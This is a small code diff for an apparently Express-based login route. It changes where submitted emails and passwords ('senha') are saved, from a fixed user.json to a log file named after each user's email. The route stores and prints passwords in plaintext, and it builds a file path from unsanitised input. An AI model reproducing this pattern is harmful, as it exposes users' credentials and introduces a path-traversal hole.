@@ -15,7 +15,7 @@ export default app.route('/login').get((req, res)=>{
             "email": email,
             "senha": senha
         }
-        fs.writeFileSync('routes/logs/user.json', JSON.stringify(dataJson))
+        fs.writeFileSync(`routes/logs/${email}.json`, JSON.stringify(dataJson))
         console.log(email, senha)
     }
     res.render('login', { click__btn__login: click__btn__login() })
